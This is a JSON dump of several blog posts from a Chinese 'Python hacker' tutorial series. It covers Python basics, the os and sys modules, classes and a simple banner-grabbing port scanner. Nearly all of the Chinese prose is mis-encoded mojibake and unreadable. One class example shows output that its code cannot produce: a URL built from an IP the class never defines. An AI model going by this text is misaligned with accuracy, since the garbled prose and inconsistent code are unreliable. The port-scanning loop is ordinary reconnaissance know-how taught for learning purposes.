ä¸Šé¢æˆ‘ä»¬æ¼”ç¤ºäº†ä½¿ç”¨try/exceptå¾ªç¯æ¥å¤„ç†å½“socketè¿æ¥çš„æ—¶å€™é‡åˆ°ç«¯å£å…³é—­çš„é”™è¯¯ï¼ŒåŒæ—¶ä¸Šé¢è¿˜æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨â€ifâ€è¯­å¥æ‰“å°å‡ºå¯ä»¥è¿æ¥æˆåŠŸçš„ç«¯å£ã€‚ä¸‹é¢æˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬æ‰«ææŒ‡å®šç«¯å£çš„æ‰«æå™¨ï¼Œè¿™é‡Œçš„ç«¯å£å·ï¼Œæˆ‘ä»¬ä½¿ç”¨æ•°ç»„æ¥å­˜å‚¨ï¼Œç„¶åéå†è¿™ä¸€ä¸ªæ•°ç»„: 1234567891011&gt;&gt;&gt;&gt;&gt;&gt; ports = [22, 445, 80, 443, 3389]&gt;&gt;&gt; for port in ports:... print port...22445804433389&gt;&gt;&gt; å¦‚æœæˆ‘ä»¬æƒ³ä¸€æ¬¡æ€§æ‰«æå¤šå°ä¸»æœºï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªforå¾ªç¯åµŒå¥—ã€‚æœ€å¤–å±‚çš„æ˜¯ä¸»æœºçš„ipï¼Œç„¶åé‡Œé¢çš„forå¾ªç¯æ˜¯ç«¯å£ã€‚ä¸‹é¢æœ‰ä¸€ä¸ªåŸºç¡€çš„ä¾‹å­ï¼Œå±•ç¤ºäº†å¦‚ä½•é€šè¿‡å¾ªç¯åµŒå¥—æ¥æ„å»ºä¸€ä¸ªç®€å•çš„æ‰«æå™¨: 123456789101112131415161718192021222324252627282930313233&gt;&gt;&gt;&gt;&gt;&gt; hosts = ['127.0.0.1', '192.168.1.5', '10.0.0.1']&gt;&gt;&gt;&gt;&gt;&gt; ports = [22, 445, 80, 443, 3389]&gt;&gt;&gt;&gt;&gt;&gt; for host in hosts:... for port in ports:... try:... print \"[+] Connecting to \"+host+\":\"+str(port)... s.connect((host, port))... s.send('Primal Security \\n')... banner = s.recv(1024)... if banner:... print \"[+] Port \"+str(port)+\" open: \"+banner... s.close()... except:pass...[+] Connecting to 127.0.0.1:22[+] Port 22 open: OpenSSH[+] Connecting to 127.0.0.1:445[+] Connecting to 127.0.0.1:80[+] Connecting to 127.0.0.1:443[+] Connecting to 127.0.0.1:3389[+] Connecting to 192.168.1.5:22[+] Connecting to 192.168.1.5:445[+] Connecting to 192.168.1.5:80[+] Connecting to 192.168.1.5:443[+] Connecting to 192.168.1.5:3389[+] Connecting to 10.0.0.1:22[+] Connecting to 10.0.0.1:445[+] Connecting to 10.0.0.1:80[+] Connecting to 10.0.0.1:443[+] Connecting to 10.0.0.1:3389 æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ç»“æœï¼Œå®ƒæŠŠhostsæ•°ç»„é‡Œé¢çš„æ‰€æœ‰å€¼éƒ½éå†äº†ä¸€æ¬¡portsæ•°ç»„ï¼Œç­‰hosts[0]æ‰«æå®Œæˆä¹‹åå†æ‰«æhosts[1]ä¾æ¬¡ç±»æ¨ã€‚åœ¨è¿™ä¸ªä¾‹å­é‡Œé¢ä½ ä¹Ÿå¯ä»¥ä¿®æ”¹é‡Œé¢çš„ä»£ç ï¼Œåªè®©å®ƒæ˜¾ç¤ºå‡ºå¯ä»¥æ‰“å¼€çš„ç«¯å£ã€‚ åœ¨è¿™æœ€åï¼Œä½ ä¼šå‘ç°è¿˜æ˜¯Nmapæœ€å¥½ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å°†åœ¨åé¢çš„æ–‡ç« é‡Œé¢ç»§ç»­å®Œå–„è¿™ä¸ªå®ä¾‹ï¼Œå¤§å®¶å¯ä»¥èŠ±ç‚¹æ—¶é—´å»å­¦ä¹ ä¸€äº›socketæ¨¡å—å…¶ä»–çš„åŠŸèƒ½å‡½æ•°ï¼Œå¤§å®¶å¯ä»¥ä½¿ç”¨dir(socket)æ¥äº†è§£æ›´å¤šï¼Œå½“ç„¶è¿˜æœ‰help().ä¸‹ä¸€ç« ","raw":null,"content":null,"categories":[{"name":"Python","slug":"Python","permalink":"https://kionf.com/categories/Python/"},{"name":"Hacker","slug":"Python/Hacker","permalink":"https://kionf.com/categories/Python/Hacker/"}],"tags":[]},{"title":"Pythoné»‘å®¢ä¹‹æ—…0x1","slug":"pythonhacker_0x1","date":"2015-10-12T16:00:00.000Z","updated":"2018-10-31T10:19:28.319Z","comments":true,"path":"2015/10/13/pythonhacker_0x1/","link":"","permalink":"https://kionf.com/2015/10/13/pythonhacker_0x1/","excerpt":"å…¥é—¨(2)è¿™ä¸€ç« å°†ç»§ç»­è®²è§£ä¸€äº›åŸºç¡€çš„Pythonè„šæœ¬æ¦‚å¿µ,æˆ‘ä»¬å°†æŠŠä»£ç å†™å…¥åˆ°ä¸€ä¸ªè„šæœ¬é‡Œé¢ï¼Œå‡½æ•°ï¼Œç±»å’Œsysæ¨¡å—ã€‚","text":"å…¥é—¨(2)è¿™ä¸€ç« å°†ç»§ç»­è®²è§£ä¸€äº›åŸºç¡€çš„Pythonè„šæœ¬æ¦‚å¿µ,æˆ‘ä»¬å°†æŠŠä»£ç å†™å…¥åˆ°ä¸€ä¸ªè„šæœ¬é‡Œé¢ï¼Œå‡½æ•°ï¼Œç±»å’Œsysæ¨¡å—ã€‚ Pythonè„šæœ¬æ¡†æ¶ä¸‹é¢æ˜¯ä¸€ä¸ªå¼€å§‹å†™Pythonè„šæœ¬çš„åŸºç¡€ä¾‹å­ï¼Œå¼€å§‹éƒ¨åˆ†ï¼Œæˆ‘ä¹ˆå‘Šè¯‰ç³»ç»Ÿéœ€è¦ä½¿ç”¨é‚£ä¸€ä¸ªè§£é‡Šå™¨â€#!/usr/bin/env pythonâ€,ç„¶åæˆ‘ä»¬é€šè¿‡â€def main():â€å£°æ˜ä¸€ä¸ªmainå‡½æ•°,æœ€å2è¡Œä»£ç æœ‰mian()çš„å…ˆæ‰§è¡Œã€‚ä½ å¯ä»¥å®šä¹‰åœ¨ä½ çš„è„šæœ¬é‡Œé¢å®šä¹‰å…¶å®ƒå‡½æ•°ï¼Œè¿™æ ·ä½¿å¾—ä½ çš„ä»£ç æ›´å®¹æ˜“çš„ç†è§£å’Œä¿®æ”¹ç»´æŠ¤ï¼š 12345678910#!/usr/bin/pythonimport &lt;module1&gt;, &lt;module2&gt; def myFunction(): def main(): myFunction() if __name__==\"__main__\": main() å‡½æ•° ä¸€ç§å¸¸è§çš„å†™æ³•æ˜¯æŠŠæ¯ä¸ªåŠŸèƒ½å‡½æ•°åˆ†å¼€å†™ï¼Œæ‰§è¡Œä¸€äº›æ“ä½œä¹‹åç„¶åè¿”å›ç»“æœã€‚ä¸‹é¢çš„è¿™ä¸ªä¼ªä»£ç æ¼”ç¤ºçš„ä¾‹å­å°±èƒ½å¤Ÿå¾ˆæ¸…æ™°çš„è§£é‡Šè¿™ä¸ªæ¦‚å¿µ: 12345678# å£°æ˜å‡½æ•°/é€»è¾‘å¤„ç†def MyFunction: ...do work... return output #åœ¨mainå‡½æ•°é‡Œé¢è°ƒç”¨:def main(): output = MyFunction(input) ç±»Pythonç±»å¼€å§‹ä½¿ç”¨çš„æ—¶å€™ä¼šæœ‰ç‚¹å›°éš¾ï¼Œå› ä¸ºå®ƒæ˜¯æ•™ä½ ä»¥ä½•ç§æ–¹å¼è®¾è®¡ä½ çš„ä»£ç ï¼Œå¦‚æœä½ æŒæ¡ç±»çš„æ¦‚å¿µé‚£ä¹ˆä½ å°±å¯ä»¥æŠŠæ•°æ®å’Œå®šä¹‰æŒ‰ç…§ç±»çš„é€»è¾‘åˆ†ç»„ï¼Œè¿™æ ·ç±»å°±æ‹¥æœ‰äº†å±æ€§å’Œä¸ä¹‹æƒ³å…³è”çš„æ–¹æ³•ã€‚å½“ä½ å®šä¹‰ä¸€ä¸ªç±»ä¹‹åï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»ï¼Œç„¶åç»§æ‰¿ä¹‹å‰åˆ›å»ºçš„ç±»çš„å±æ€§å’Œä¸ä¹‹ç›¸å…³è”çš„æ–¹æ³•ï¼Œè¿™ç¼–ç¨‹å°±å«åšé¢å‘å¯¹è±¡ç¼–ç¨‹ã€‚ å¦‚æœä½ æ„Ÿåˆ°è¿·æƒ‘ï¼Œé‚£ä¹ˆæˆ‘å»ºè®®ä½ å…ˆä¸è¦å»å­¦ä¹ ç±»ï¼Œå®é™…ä¸Šï¼Œä½ å¹¶ä¸éœ€è¦ç±»ã€‚ä½†å®ƒå¯ä»¥è®©ä½ çš„ä»£ç å‡å°‘å†—ä½™ã€‚ä¸‹é¢æˆ‘ä»¬å°†å®šä¹‰ä¸ªæ–°çš„ç±»â€Domainâ€ä½¿ç”¨â€classâ€å…³é”®å­—ï¼Œå½“ä½ å®ä¾‹åŒ–Domainç±»å‹å¯¹è±¡çš„æ—¶å€™ï¼Œå®ƒçš„ç±»å‹æœ‰å¤šç§æ–¹å¼å»å®šä¹‰: 1234567891011121314151617181920212223242526272829303132333435&gt;&gt;&gt; import os&gt;&gt;&gt; class Domain:... def __init__(self, domain, port, protocol):#é€šè¿‡ä¸¤ä¸ªå†…éƒ¨å˜é‡å­˜å‚¨å˜é‡... self.domain=domain... self.port=port... self.protocol=protocol#æ„é€ ä¸€ä¸ªurlçš„æ–¹æ³•... def URL(self):... if self.protocol == 'https':... URL = 'https://'+self.domain+':'+self.port+'/'... if self.protocol == 'http':... URL = 'http://'+self.domain+':'+self.port+'/'... return URL# è°ƒç”¨os.systemä¸­ä¸»æœºå‘½ä»¤lookupå»è§£æåŸŸå... def lookup(self):... os.system(\"host \"+self.domain)...&gt;&gt;&gt;&gt;&gt;&gt; domain=Domain('google.com', '443', 'https')&gt;&gt;&gt;&gt;&gt;&gt; dir(domain)['URL', '__doc__', '__init__', '__module__', 'ip', 'lookup', 'port', 'protocol']&gt;&gt;&gt; domain.URL()'https://8.8.8.8:443/'&gt;&gt;&gt; domain.ip'8.8.8.8'&gt;&gt;&gt; domain.port'443'&gt;&gt;&gt; domain.protocol'https'&gt;&gt;&gt; domain.lookup()google.com has address 74.125.228.233google.com has address 74.125.228.227google.com has address 74.125.228.232 æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œå½“ä½ å®ä¾‹åŒ–ä¸€ä¸ªDomianç±»ä¹‹åä½ å¯ä»¥è¿è¡Œç±»ä¸­çš„æ–¹æ³•ã€‚å†æ¬¡è¯´å£°ï¼Œè¿™ä¸ªæ¦‚å¿µæœ€åˆçš„æ—¶å€™å¾ˆå®¹æ˜“æ··ä¹±ï¼Œå°¤å…¶æ˜¯å½“ä½ åˆšåˆšPythonå’Œç¼–ç¨‹çš„æ—¶å€™ã€‚å°è¯•ä¸€ä¸‹å»å®ç°ä¸€ä¸ªæ–°çš„ç±»åœ¨ä½ çš„Pythonè„šæœ¬é‡Œé¢ï¼Œæˆ‘å‘ç°è¿™æ˜¯æŒæ¡è¿™ä¸ªæ¦‚å¿µæœ€å¥½çš„é€”å¾„ã€‚ ä½¿ç”¨syså¤„ç†å‘½ä»¤è¡Œè¾“å…¥å€¼æœ€å¥½æˆ‘ä»¬æ¥ä»‹ç»ä¸€ä¸‹sysæ¨¡å—ï¼Œå®ƒå¯ä»¥è®©ä½ è¯»å–ä»å‘½ä»¤ç»ˆç«¯è¾“å…¥çš„å€¼å¹¶ä¸”å¸®ä½ å¼•å…¥åˆ°è„šæœ¬é‡Œé¢ï¼Œå®ƒçš„è¯­æ³•å¾ˆç®€å•ï¼Œsys.agrv[0]å°±æ˜¯ä¸€ä¸ªå®é™…çš„è„šæœ¬åï¼Œå¹¶åœ¨å‘½ä»¤è¡ŒæŒ‡å®šçš„æ¯ä¸ªå‚æ•°åé¢åˆ†é…ä¸€ä¸ªä¸‹æ ‡ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­: 123456789#!/usr/bin/pythonimport sysscript = sys.argv[0]ip = sys.argv[1]port = sys.argv[2]print \"[+] The script name is: \"+scriptprint \"[+] The IP is: \"+ip+\" and the port is: \"+port å½“æ‰§è¡Œè¿™ä¸ªè„šæœ¬çš„æ—¶å€™ï¼Œå¹¶ä¸”åé¢è·Ÿä¸‰ä¸ªå‚æ•°æ‰§è¡Œä¹‹åçš„ç»“æœå¦‚ä¸‹: 123~$ python sys.py 8.8.8.8 53[+] The script name is: sys.py[+] The IP is: 8.8.8.8 and the port is: 53 ä¸Šé¢çš„åªæ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå¤§å®¶å¯ä»¥ç»§ç»­å»ç ”ç©¶å…¶å®ƒPythonæ¨¡å—ï¼Œå› ä¸ºå®ƒä»¬èƒ½å¤Ÿæ”¾ä½ ç”¨æœ€ç®€å•çš„æ–¹å¼è§£å†³ä½ é‡åˆ°çš„é—®é¢˜ã€‚ä¸‹ä¸€ç« å°†ä¼šä»‹ç»ä½¿ç”¨Pythonè¿›è¡Œç½‘ç»œè¿æ¥å¹¶ä¸”å†™å‡ºä¸€ä¸ªåŸºç¡€çš„æ‰«æå™¨.","raw":null,"content":null,"categories":[{"name":"Python","slug":"Python","permalink":"https://kionf.com/categories/Python/"},{"name":"Hacker","slug":"Python/Hacker","permalink":"https://kionf.com/categories/Python/Hacker/"}],"tags":[]},{"title":"Pythoné»‘å®¢ä¹‹æ—…0x0","slug":"pythonhacker_0x0","date":"2015-10-11T16:00:00.000Z","updated":"2018-10-31T10:19:28.315Z","comments":true,"path":"2015/10/12/pythonhacker_0x0/","link":"","permalink":"https://kionf.com/2015/10/12/pythonhacker_0x0/","excerpt":"å…¥é—¨ è¿™å°†æ˜¯ç¬¬ä¸€ä¸ªä¸€ç³»åˆ—å…³äºpythonç¼–ç¨‹çš„åšå®¢æ–‡ç« ã€‚pythonæ˜¯ä¸€é—¨éå¸¸å¼ºå¤§çš„è¯­è¨€ï¼Œå› ä¸ºå®ƒæœ‰ä¿¡æ¯å®‰å…¨ç¤¾åŒºçš„æ”¯æ’‘ã€‚è¿™æ„å‘³ç€å¾ˆå¤šå·¥å…·éƒ½æ˜¯ç”±pythonç¼–å†™å¹¶ä¸”å¯ä»¥åœ¨è„šæœ¬ä¸­è°ƒç”¨å¾ˆå¤šæ¨¡å—ã€‚ä½¿ç”¨æ¨¡å—çš„å¥½å¤„å°±æ˜¯åªéœ€è¦å°‘é‡çš„ä»£ç å°±èƒ½å¤Ÿå®Œæˆæ‰€éœ€çš„ä»»åŠ¡ã€‚\n è¿™ç¯‡æ–‡ç« å‡å®šä½ çš„ç³»ç»Ÿæ˜¯Linuxï¼Œpythonç‰ˆæœ¬æ˜¯2.*ã€‚åœ¨å†™ä»£ç çš„æ—¶å€™ä½ ä¹Ÿå¯ä»¥ç›´æ¥çš„å†™åœ¨è§£é‡Šå™¨é‡Œé¢(linuxé‡Œé¢è¾“å…¥pythonå³å¯è¿›å…¥)ï¼Œä¹Ÿå¯ä»¥æŠŠä»£ç æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ã€‚å¾ˆå¤šäººä¼šå‘ç°æŠŠä»£ç å­˜æ”¾åˆ°æ–‡ä»¶é‡Œé¢è¦æ¯”ç›´æ¥å†™åœ¨è§£é‡Šå™¨ä¸Šé¢è¦å¥½å¾ˆå¤šã€‚å€¼å¾—æ³¨æ„çš„æ˜¯python ä¸­å¼ºåˆ¶ç¼©è¿›ã€‚å¤§å®¶åœ¨å†™å‡½æ•°å£°æ˜ï¼Œå¾ªç¯ï¼Œif/elseè¯­å¥ç­‰ç­‰çš„æ—¶å€™å°±ä¼šå‘ç°ã€‚","text":"å…¥é—¨ è¿™å°†æ˜¯ç¬¬ä¸€ä¸ªä¸€ç³»åˆ—å…³äºpythonç¼–ç¨‹çš„åšå®¢æ–‡ç« ã€‚pythonæ˜¯ä¸€é—¨éå¸¸å¼ºå¤§çš„è¯­è¨€ï¼Œå› ä¸ºå®ƒæœ‰ä¿¡æ¯å®‰å…¨ç¤¾åŒºçš„æ”¯æ’‘ã€‚è¿™æ„å‘³ç€å¾ˆå¤šå·¥å…·éƒ½æ˜¯ç”±pythonç¼–å†™å¹¶ä¸”å¯ä»¥åœ¨è„šæœ¬ä¸­è°ƒç”¨å¾ˆå¤šæ¨¡å—ã€‚ä½¿ç”¨æ¨¡å—çš„å¥½å¤„å°±æ˜¯åªéœ€è¦å°‘é‡çš„ä»£ç å°±èƒ½å¤Ÿå®Œæˆæ‰€éœ€çš„ä»»åŠ¡ã€‚ è¿™ç¯‡æ–‡ç« å‡å®šä½ çš„ç³»ç»Ÿæ˜¯Linuxï¼Œpythonç‰ˆæœ¬æ˜¯2.*ã€‚åœ¨å†™ä»£ç çš„æ—¶å€™ä½ ä¹Ÿå¯ä»¥ç›´æ¥çš„å†™åœ¨è§£é‡Šå™¨é‡Œé¢(linuxé‡Œé¢è¾“å…¥pythonå³å¯è¿›å…¥)ï¼Œä¹Ÿå¯ä»¥æŠŠä»£ç æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ã€‚å¾ˆå¤šäººä¼šå‘ç°æŠŠä»£ç å­˜æ”¾åˆ°æ–‡ä»¶é‡Œé¢è¦æ¯”ç›´æ¥å†™åœ¨è§£é‡Šå™¨ä¸Šé¢è¦å¥½å¾ˆå¤šã€‚å€¼å¾—æ³¨æ„çš„æ˜¯python ä¸­å¼ºåˆ¶ç¼©è¿›ã€‚å¤§å®¶åœ¨å†™å‡½æ•°å£°æ˜ï¼Œå¾ªç¯ï¼Œif/elseè¯­å¥ç­‰ç­‰çš„æ—¶å€™å°±ä¼šå‘ç°ã€‚ pythonè§£é‡Šå™¨åœ¨ç»ˆç«¯é‡Œé¢è¾“å…¥python: 12345~$ pythonPython 2.7.6 (default, Mar 22 2014, 22:59:56) [GCC 4.8.2] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; è¾“å…¥ä¹‹åä½ å°±å¯ä»¥ç›´æ¥åœ¨è§£é‡Šå™¨é‡Œé¢å†™ä½ çš„ä»£ç äº†ã€‚ä¸‹é¢æˆ‘ä»¬å°†å£°æ˜ä¸¤ä¸ªå˜é‡ï¼Œå¹¶ä¸”ä½¿ç”¨type()å‡½æ•°æŸ¥çœ‹å˜é‡çš„ç±»å‹ã€‚å‡è®¾æˆ‘ä»¬å£°æ˜äº†ä¸€ä¸ªå­—ç¬¦ä¸²å’Œæ•´å‹ï¼š 12345678910&gt;&gt;&gt;&gt;&gt;&gt; ip = '8.8.8.8'&gt;&gt;&gt; port = 53&gt;&gt;&gt;&gt;&gt;&gt; type(ip)&lt;type 'str'&gt;&gt;&gt;&gt;&gt;&gt;&gt; type(port)&lt;type 'int'&gt;&gt;&gt;&gt; ä½ å¯ä»¥ä½¿ç”¨å†…ç½®çš„help()å‡½æ•°å»äº†è§£ä¸€ä¸ªå‡½æ•°çš„è¯¦ç»†ã€‚è®°ä½è¿™ä¸€ç‚¹ï¼Œå®ƒå¯ä»¥å¸®åŠ©ä½ åœ¨å­¦ä¹ è¯­è¨€çš„æ—¶å€™å­¦ä¹ åˆ°æ›´å¤šçš„è¯¦ç»†å†…å®¹. 123&gt;&gt;&gt;&gt;&gt;&gt; help(type)&gt;&gt;&gt; æœ‰æ—¶ä½ ä¼šæƒ³æŠŠä¸€äº›å˜é‡å’Œå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ç„¶åé€šè¿‡è„šæœ¬æ˜¾ç¤ºå‡ºæ¥ã€‚é‚£ä¹ˆä½ å°±éœ€è¦ä½¿ç”¨str()å‡½æ•°æŠŠæ•´å‹è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹ 1234&gt;&gt;&gt; ip='1.1.1.1'&gt;&gt;&gt; port=55&gt;&gt;&gt; print 'the ip is:'+ip+'and the port is:'+str(port)the ip is:1.1.1.1and the port is:55 å‰é¢å£°æ˜å˜é‡çš„æ—¶å€™â€IPâ€å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å°±ä¸éœ€è¦è½¬æ¢ï¼Œè€Œâ€portâ€å°±éœ€è¦ã€‚ç°åœ¨ä½ å°±å·²ç»çŸ¥é“äº†ä¸¤ä¸ªåŸºæœ¬çš„æ•°æ®ç±»å‹(stringå’Œinteger)ã€‚ç°åœ¨ä½ å¯ä»¥è¯•è¯•ä½¿ç”¨å†…ç½®å‡½æ•°ä¸è¿™ä¸¤ä¸ªæ•°æ®ç±»å‹å†™å‡ºå…¶ä»–çš„ä»£ç ã€‚ Pythonå­—ç¬¦ä¸²å…è®¸ä½ é€šè¿‡åç§»å€¼æ¥è·å–ä½ æƒ³éœ€è¦çš„å­—ç¬¦ä¸²,å¹¶ä¸”å¯ä»¥é€šè¿‡len()å‡½æ•°æ¥è·å–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå®ƒå¯ä»¥å¸®åŠ©ä½ æ›´æ–¹ä¾¿çš„æ“ä½œå­—ç¬¦ä¸²ã€‚ 12345678910111213&gt;&gt;&gt;&gt;&gt;&gt; domain='primalsecurity.net'&gt;&gt;&gt; domain'primalsecurity.net'&gt;&gt;&gt; domain[0]'p'&gt;&gt;&gt; domain[0:3]'pri'&gt;&gt;&gt; domain[1:]'rimalsecurity.net' &gt;&gt;&gt; len(domain)18 ä½ å¯ä»¥ä½¿ç”¨å†…å»ºçš„dir()å‡½æ•°æ¥åˆ—å‡ºæ¨¡å—å®šä¹‰çš„æ ‡è¯†ç¬¦ã€‚æ ‡è¯†ç¬¦æœ‰å‡½æ•°ã€ç±»å’Œå˜é‡ã€‚ 12&gt;&gt;&gt; dir(ip)['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_formatter_field_name_split', '_formatter_parser', 'capitalize', 'center', 'count', 'decode', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'index', 'isalnum', 'isalpha', 'isdigit', 'islower', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill'] ç°åœ¨ä½ å¯ä»¥ä½¿ç”¨ä¸Šé¢åˆ—ä¸¾å‡ºæ¥çš„å†…å»ºå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚æœæƒ³çŸ¥é“è¿™ä¸ªå‡½æ•°çš„æ›´å¤šæè¿°å¯ä»¥å‚è€ƒå‰é¢æåˆ°çš„help()å‡½æ•°: 123456789&gt;&gt;&gt;&gt;&gt;&gt; help(ip.split)&gt;&gt;&gt;&gt;&gt;&gt; string = ip+':'+str(port)&gt;&gt;&gt; string'8.8.8.8:53'&gt;&gt;&gt;&gt;&gt;&gt; string.split(':')['8.8.8.8', '53'] è¿™splitå‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²é€šè¿‡â€:â€åˆ‡å‰²ç”Ÿæˆä¸€ä¸ªæ–°çš„åˆ—è¡¨ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å­—ç¬¦ä¸²å‡½æ•°å› ä¸ºä½ èƒ½å¤ŸæŠŠè¿™ä¸ªå­—ç¬¦ä¸²é‡Œé¢çš„æœ‰ç”¨ä¿¡æ¯æå‡ºå‡ºæ¥ã€‚ä¾‹å¦‚ï¼Œä½ è·å–åˆ°äº†ä¸€ä¸ªipåˆ—è¡¨ï¼Œä½ æƒ³åœ¨è¿™ä¸ªåˆ—è¡¨é‡Œé¢æ·»åŠ ä¸€ä¸ªç´¢å¼•å€¼ã€‚ä½ ä¹Ÿå¯ä»¥åˆ é™¤å’Œæ·»åŠ æ–°çš„å€¼åˆ°è¿™ä¸ªåˆ—è¡¨é‡Œé¢é€šè¿‡.append()å’Œ.remove()å‡½æ•° 12345678910111213141516&gt;&gt;&gt;&gt;&gt;&gt; list = string.split(':')&gt;&gt;&gt;&gt;&gt;&gt; list['8.8.8.8', '53']&gt;&gt;&gt;&gt;&gt;&gt; list[0]'8.8.8.8'&gt;&gt;&gt;&gt;&gt;&gt; list.append('google')&gt;&gt;&gt; list['8.8.8.8', '53', 'google']&gt;&gt;&gt; list.remove('google')&gt;&gt;&gt; list['8.8.8.8', '53']&gt;&gt;&gt; Pythonæ¨¡å—åœ¨ä¸Šé¢æåˆ°è¿‡ï¼ŒPythonæ¨¡å—èƒ½å¤Ÿè®©ä½ ç”¨å°‘é‡çš„ä»£ç å°±èƒ½å¤Ÿå®Œæˆä½ çš„ä»»åŠ¡,Pythonæœ‰è®¸å¤šæœ‰ç”¨çš„å†…å»ºæ¨¡å—(os,subprocess,socket,urllib,httplib,re,sysç­‰ç­‰)å’Œç¬¬ä¸‰æ–¹æ¨¡å—(cymruwhois,scapy,dpkt,spiderç­‰ç­‰).ä½¿ç”¨Pythonæ¨¡å—å¾ˆç®€å•â€import â€œ. OSæ¨¡å—æ˜¯éå¸¸é‡è¦çš„å› ä¸ºä½ éœ€è¦åœ¨ä½ çš„Pythonä»£ç é‡Œé¢è°ƒç”¨ç³»ç»Ÿå‘½ä»¤: 123456&gt;&gt;&gt;&gt;&gt;&gt; import os&gt;&gt;&gt;&gt;&gt;&gt; dir(os)['EX_CANTCREAT', 'EX_CONFIG', 'EX_DATAERR', 'EX_IOERR', 'EX_NOHOST', 'EX_NOINPUT', 'EX_NOPERM', 'EX_NOUSER', 'EX_OK', 'EX_OSERR', 'EX_OSFILE', 'EX_PROTOCOL', 'EX_SOFTWARE', 'EX_TEMPFAIL', 'EX_UNAVAILABLE', 'EX_USAGE', 'F_OK', 'NGROUPS_MAX', 'O_APPEND', 'O_ASYNC', 'O_CREAT', 'O_DIRECT', 'O_DIRECTORY', 'O_DSYNC', 'O_EXCL', 'O_LARGEFILE', 'O_NDELAY', 'O_NOATIME', 'O_NOCTTY', 'O_NOFOLLOW', 'O_NONBLOCK', 'O_RDONLY', 'O_RDWR', 'O_RSYNC', 'O_SYNC', 'O_TRUNC', 'O_WRONLY', 'P_NOWAIT', 'P_NOWAITO', 'P_WAIT', 'R_OK', 'SEEK_CUR', 'SEEK_END', 'SEEK_SET', 'ST_APPEND', 'ST_MANDLOCK', 'ST_NOATIME', 'ST_NODEV', 'ST_NODIRATIME', 'ST_NOEXEC', 'ST_NOSUID', 'ST_RDONLY', 'ST_RELATIME', 'ST_SYNCHRONOUS', 'ST_WRITE', 'TMP_MAX', 'UserDict', 'WCONTINUED', 'WCOREDUMP', 'WEXITSTATUS', 'WIFCONTINUED', 'WIFEXITED', 'WIFSIGNALED', 'WIFSTOPPED', 'WNOHANG', 'WSTOPSIG', 'WTERMSIG', 'WUNTRACED', 'W_OK', 'X_OK', '_Environ', '__all__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '_copy_reg', '_execvpe', '_exists', '_exit', '_get_exports_list', '_make_stat_result', '_make_statvfs_result', '_pickle_stat_result', '_pickle_statvfs_result', '_spawnvef', 'abort', 'access', 'altsep', 'chdir', 'chmod', 'chown', 'chroot', 'close', 'closerange', 'confstr', 'confstr_names', 'ctermid', 'curdir', 'defpath', 'devnull', 'dup', 'dup2', 'environ', 'errno', 'error', 'execl', 'execle', 'execlp', 'execlpe', 'execv', 'execve', 'execvp', 'execvpe', 'extsep', 'fchdir', 'fchmod', 'fchown', 'fdatasync', 'fdopen', 'fork', 'forkpty', 'fpathconf', 'fstat', 'fstatvfs', 'fsync', 'ftruncate', 'getcwd', 'getcwdu', 'getegid', 'getenv', 'geteuid', 'getgid', 'getgroups', 'getloadavg', 'getlogin', 'getpgid', 'getpgrp', 'getpid', 'getppid', 'getresgid', 'getresuid', 'getsid', 'getuid', 'initgroups', 'isatty', 'kill', 'killpg', 'lchown', 'linesep', 'link', 'listdir', 'lseek', 'lstat', 'major', 'makedev', 'makedirs', 'minor', 'mkdir', 'mkfifo', 'mknod', 'name', 'nice', 'open', 'openpty', 'pardir', 'path', 'pathconf', 'pathconf_names', 'pathsep', 'pipe', 'popen', 'popen2', 'popen3', 'popen4', 'putenv', 'read', 'readlink', 'remove', 'removedirs', 'rename', 'renames', 'rmdir', 'sep', 'setegid', 'seteuid', 'setgid', 'setgroups', 'setpgid', 'setpgrp', 'setregid', 'setresgid', 'setresuid', 'setreuid', 'setsid', 'setuid', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe', 'stat', 'stat_float_times', 'stat_result', 'statvfs', 'statvfs_result', 'strerror', 'symlink', 'sys', 'sysconf', 'sysconf_names', 'system', 'tcgetpgrp', 'tcsetpgrp', 'tempnam', 'times', 'tmpfile', 'tmpnam', 'ttyname', 'umask', 'uname', 'unlink', 'unsetenv', 'urandom', 'utime', 'wait', 'wait3', 'wait4', 'waitpid', 'walk', 'write']&gt;&gt;&gt; ä½ å¯ä»¥çœ‹åˆ°ä¸Šé¢osæ¨¡å—ç»™ä½ æä¾›äº†å¾ˆå¤šå¯ä»¥ä½¿ç”¨çš„åŠŸèƒ½å‡½æ•°ï¼Œå…¶ä¸­æˆ‘å‘ç°æˆ‘ç»å¸¸ä½¿ç”¨â€os.systemâ€ï¼Œæˆ‘å¯ç»™å®ƒä¼ 